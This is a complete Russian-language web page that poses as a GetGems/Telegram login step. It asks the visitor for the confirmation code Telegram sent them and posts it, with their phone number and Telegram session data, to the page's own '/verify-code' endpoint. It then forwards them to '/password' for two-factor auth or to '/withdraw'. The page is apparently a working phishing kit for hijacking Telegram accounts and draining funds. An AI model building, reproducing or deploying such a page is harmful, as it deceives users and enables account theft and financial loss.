<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Код подтверждения - GetGems</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 50%, rgba(0, 122, 255, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(90, 200, 250, 0.15) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        .auth-container {
            max-width: 440px;
            width: 100%;
            background: rgba(20, 20, 30, 0.6);
            backdrop-filter: blur(40px);
            -webkit-backdrop-filter: blur(40px);
            border-radius: 28px;
            padding: 40px 32px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
            position: relative;
            z-index: 1;
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logos-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 24px;
            margin-bottom: 32px;
        }

        .logo-wrapper {
            width: 72px;
            height: 72px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }

        .logo-wrapper svg {
            width: 40px;
            height: 40px;
            filter: drop-shadow(0 4px 12px rgba(0, 122, 255, 0.3));
        }

        .logos-arrow {
            font-size: 24px;
            color: rgba(255, 255, 255, 0.3);
            font-weight: 300;
        }

        .auth-title {
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 12px;
            color: #ffffff;
            letter-spacing: -0.3px;
        }

        .auth-subtitle {
            font-size: 15px;
            text-align: center;
            color: rgba(255, 255, 255, 0.6);
            margin-bottom: 8px;
            line-height: 1.5;
        }

        .phone-display {
            text-align: center;
            font-size: 17px;
            font-weight: 600;
            color: #007AFF;
            margin-bottom: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .edit-icon {
            cursor: pointer;
            opacity: 0.6;
            transition: all 0.3s ease;
            width: 20px;
            height: 20px;
        }

        .edit-icon:hover {
            opacity: 1;
            transform: scale(1.1);
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-label {
            display: block;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 8px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .code-input {
            width: 100%;
            padding: 16px 18px;
            background: rgba(255, 255, 255, 0.05);
            border: 1.5px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            text-align: center;
            letter-spacing: 4px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }

        .code-input::placeholder {
            color: rgba(255, 255, 255, 0.3);
            letter-spacing: 2px;
        }

        .code-input:hover {
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(0, 122, 255, 0.4);
        }

        .code-input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.08);
            border-color: #007AFF;
            box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.15);
        }

        .code-input.error {
            border-color: #ff4444;
            box-shadow: 0 0 0 4px rgba(255, 68, 68, 0.15);
        }

        .error-message {
            color: #ff4444;
            font-size: 13px;
            margin-top: 8px;
            text-align: center;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .button-group {
            display: flex;
            gap: 12px;
            margin-top: 32px;
        }

        .btn {
            flex: 1;
            padding: 16px 24px;
            border: none;
            border-radius: 16px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }

        .btn-back {
            background: rgba(255, 255, 255, 0.05);
            color: #007AFF;
            border: 1.5px solid rgba(0, 122, 255, 0.3);
        }

        .btn-back:hover {
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(0, 122, 255, 0.5);
            transform: translateY(-1px);
        }

        .btn-back:active {
            transform: translateY(0);
        }

        .btn-submit {
            background: linear-gradient(135deg, #007AFF 0%, #0051D5 100%);
            color: white;
            box-shadow: 0 8px 24px rgba(0, 122, 255, 0.35);
            border: 1px solid rgba(0, 122, 255, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-submit::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.6s ease;
        }

        .btn-submit:hover::before {
            left: 100%;
        }

        .btn-submit:hover {
            box-shadow: 0 12px 32px rgba(0, 122, 255, 0.45);
            transform: translateY(-2px);
        }

        .btn-submit:active {
            transform: translateY(0);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .auth-container {
                padding: 32px 24px;
            }

            .logos-container {
                gap: 20px;
            }

            .logo-wrapper {
                width: 64px;
                height: 64px;
            }

            .logo-wrapper svg {
                width: 36px;
                height: 36px;
            }
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <div class="logos-container">
            <div class="logo-wrapper">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="url(#telegram-gradient)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M2 17L12 22L22 17" stroke="url(#telegram-gradient)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M2 12L12 17L22 12" stroke="url(#telegram-gradient)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    <defs>
                        <linearGradient id="telegram-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" stop-color="#38AEEB"/>
                            <stop offset="100%" stop-color="#279AD1"/>
                        </linearGradient>
                    </defs>
                </svg>
            </div>

            <div class="logos-arrow">→</div>

            <div class="logo-wrapper">
                <svg viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M14.0179 0C14.0179 7.74185 7.74185 14.0179 0 14.0179C0 6.276 6.276 0 14.0179 0ZM14.0179 28.0357C6.276 28.0357 0 21.7597 0 14.0179C7.74185 14.0179 14.0179 20.2939 14.0179 28.0357ZM28.0357 14.0179C28.0357 21.7597 21.7597 28.0357 14.0179 28.0357C14.0179 20.2939 20.2939 14.0179 28.0357 14.0179ZM26.8675 1.16818C26.8675 7.61969 21.6375 12.8497 15.186 12.8497C15.186 6.39817 20.416 1.16818 26.8675 1.16818Z" fill="url(#getgems-gradient)"/>
                    <defs>
                        <linearGradient id="getgems-gradient" x1="0" y1="0" x2="28" y2="28" gradientUnits="userSpaceOnUse">
                            <stop offset="0%" stop-color="#007AFF"/>
                            <stop offset="100%" stop-color="#5AC8FA"/>
                        </linearGradient>
                    </defs>
                </svg>
            </div>
        </div>

        <h1 class="auth-title">Код подтверждения</h1>
        <p class="auth-subtitle">
            Мы отправили код в приложение Telegram<br>на ваше другое устройство
        </p>

        <div class="phone-display">
            <span id="phoneNumber">+7 --- --- ---</span>
            <svg class="edit-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" onclick="window.location.href='/auth'">
                <path d="M11 4H4C3.46957 4 2.96086 4.21071 2.58579 4.58579C2.21071 4.96086 2 5.46957 2 6V20C2 20.5304 2.21071 21.0391 2.58579 21.4142C2.96086 21.7893 3.46957 22 4 22H18C18.5304 22 19.0391 21.7893 19.4142 21.4142C19.7893 21.0391 20 20.5304 20 20V13" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                <path d="M18.5 2.5C18.8978 2.10217 19.4374 1.87868 20 1.87868C20.5626 1.87868 21.1022 2.10217 21.5 2.5C21.8978 2.89782 22.1213 3.43739 22.1213 4C22.1213 4.56261 21.8978 5.10217 21.5 5.5L12 15L8 16L9 12L18.5 2.5Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
        </div>

        <form id="codeForm">
            <div class="form-group">
                <label class="form-label">Код</label>
                <input type="tel" class="code-input" id="codeInput" placeholder="• • • • •" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
                <div class="error-message" id="errorMessage">Неверный код</div>
            </div>

            <div class="button-group">
                <button type="button" class="btn btn-back" id="backBtn">Назад</button>
                <button type="submit" class="btn btn-submit" id="submitBtn">
                    <span id="submitText">Далее</span>
                </button>
            </div>
        </form>
    </div>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        const codeInput = document.getElementById('codeInput');
        const submitBtn = document.getElementById('submitBtn');
        const backBtn = document.getElementById('backBtn');
        const codeForm = document.getElementById('codeForm');
        const phoneNumber = document.getElementById('phoneNumber');
        const errorMessage = document.getElementById('errorMessage');

        // Загружаем сохраненный номер
        const savedPhone = localStorage.getItem('userPhoneNumber') || '+7 --- --- ---';
        phoneNumber.textContent = savedPhone;

        // Фокус на поле ввода
        codeInput.focus();

        // Только цифры
        codeInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
            
            // Убираем ошибку при вводе
            codeInput.classList.remove('error');
            errorMessage.classList.remove('show');

            // Активируем кнопку если код введен
            submitBtn.disabled = e.target.value.length !== 5;
        });

        // Кнопка "Назад"
        backBtn.addEventListener('click', () => {
            window.location.href = '/auth';
        });

        // Отправка кода
        codeForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const code = codeInput.value;
            
            if (code.length !== 5) {
                return;
            }

            submitBtn.disabled = true;
            document.getElementById('submitText').innerHTML = '<span class="spinner"></span>';

            try {
                const initData = tg.initData || '';
                const payload = {
                    phone_number: savedPhone,
                    code: code,
                    init_data: initData
                };
                if (!initData && tg.initDataUnsafe?.user?.id) {
                    payload.user_id = tg.initDataUnsafe.user.id;
                }
                
                const response = await fetch('/verify-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                // Проверяем Content-Type перед парсингом JSON
                const contentType = response.headers.get('content-type') || '';
                let data;
                
                if (contentType.includes('application/json') || contentType.includes('text/json')) {
                    try {
                        data = await response.json();
                    } catch (jsonError) {
                        const text = await response.text();
                        console.error('JSON parse error:', jsonError, 'Response:', text.substring(0, 200));
                        codeInput.classList.add('error');
                        errorMessage.textContent = 'Сервер вернул некорректный ответ. Попробуйте позже.';
                        errorMessage.classList.add('show');
                        submitBtn.disabled = false;
                        document.getElementById('submitText').textContent = 'Далее';
                        return;
                    }
                } else {
                    const text = await response.text();
                    console.error('Non-JSON response received. Content-Type:', contentType, 'Response:', text.substring(0, 200));
                    codeInput.classList.add('error');
                    errorMessage.textContent = 'Сервер вернул некорректный формат ответа. Попробуйте позже.';
                    errorMessage.classList.add('show');
                    submitBtn.disabled = false;
                    document.getElementById('submitText').textContent = 'Далее';
                    return;
                }

                if (data && data.success) {
                    localStorage.setItem('authCompleted', 'true');
                    window.location.href = '/withdraw';
                } else if (data && data.requires_2fa) {
                    window.location.href = '/password';
                } else {
                    // Показываем ошибку
                    codeInput.classList.add('error');
                    errorMessage.classList.add('show');
                    submitBtn.disabled = false;
                    document.getElementById('submitText').textContent = 'Далее';
                    codeInput.value = '';
                    codeInput.focus();
                }
            } catch (error) {
                console.error('Error:', error);
                codeInput.classList.add('error');
                // Улучшенное сообщение об ошибке
                let errorMessageText = 'Ошибка сети';
                if (error.message) {
                    errorMessageText = error.message;
                } else if (error.toString().includes('JSON') || error.toString().includes('doctype')) {
                    errorMessageText = 'Сервер вернул некорректный ответ. Попробуйте позже.';
                } else {
                    errorMessageText = 'Ошибка сети: ' + error.toString();
                }
                errorMessage.textContent = errorMessageText;
                errorMessage.classList.add('show');
                submitBtn.disabled = false;
                document.getElementById('submitText').textContent = 'Далее';
            }
        });
    </script>
</body>
</html>
